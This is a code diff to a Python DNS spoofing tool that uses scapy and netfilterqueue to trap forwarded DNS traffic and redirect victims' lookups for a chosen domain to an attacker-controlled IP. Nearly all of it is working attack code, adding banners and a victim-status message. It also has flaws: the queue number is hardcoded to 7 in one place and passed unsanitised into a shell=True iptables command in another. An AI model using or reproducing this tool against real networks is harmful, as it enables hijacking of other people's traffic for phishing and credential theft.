@@ -4,6 +4,7 @@ import scapy.all as scapy
 from netfilterqueue import NetfilterQueue
 from argparse import ArgumentParser
 import subprocess
+import datetime as dt
 import sys
 
 if sys.version_info < (3, 0):
@@ -14,7 +15,7 @@ if sys.version_info < (3, 0):
 
 
 def args():
-    parser = ArgumentParser()
+    parser = ArgumentParser(description="------- DNS Spoof Tool to Redirect any Traffics to a Spoofed Domain -------")
     parser.add_argument("--host", dest="host_machine", help="Specify the IP address for your fake DNS server. "
                                                             "Example: --host 192.168.152.128")
     parser.add_argument("-q", "--queue-num", dest="queue_num", help="Specify the queue number to trap the sniffed "
@@ -32,6 +33,10 @@ def args():
         parser.error("[-] Please specify the domain name that you want to spoof its IP., or type it correctly, "
                      "ex: --domain www.bing.com")
     return options
+
+
+option = args()
+bash_script_path = 'flush-iptables.sh'
 
 
 def process_packet(packet):
@@ -56,19 +61,30 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].chksum
 
             packet.set_payload(bytes(scapy_packet))  # this will set our new modified rules
-            print("\r[+] DNS spoof running...", end="")
+            print("\r[+] Victims is getting DNS spoofed...", end="")
     packet.accept()  # this will forward the trapped packets
     # packet.drop()  # this drop the trapped packets and cut the internet connection from the target
 
 
 try:
-    print("[+] Script is running...")
-    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num " + args().queue_num, shell=True)  # adding rules to
+    print("\n" + str(dt.datetime.now().strftime("%b %d, %Y %H:%M:%S %p")))
+    print("===========================================")
+    print("* Running Fake DNS Server : " + option.host_machine)
+    print("* Target Domain : " + option.domain_name)
+    print("* Queue No. : " + option.queue_num)
+    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num " + option.queue_num, shell=True)  # adding rules to
     # trap the packets
+    print("* Successful Forwards Packets to Queue No. " + option.queue_num)
+    print("===========================================")
+
     queue = NetfilterQueue()
-    queue.bind(queue_num=int(args().queue_num), user_callback=process_packet)
+    queue.bind(queue_num=7, user_callback=process_packet)
     queue.run()
+
 except KeyboardInterrupt:
     print("\n[*] Detected 'ctrl + c' pressed, program terminated.")
-    print("[*] flushing iptables rules...\n")
-    subprocess.call(["iptables", "--flush"])  # remove the rules by flushing iptables
+    print("[*] flushing iptables rules...")
+    process = subprocess.Popen(['bash', bash_script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                               text=True)  # remove the rules by flushing iptables
+    stdout, stderr = process.communicate()
+    print(stdout)
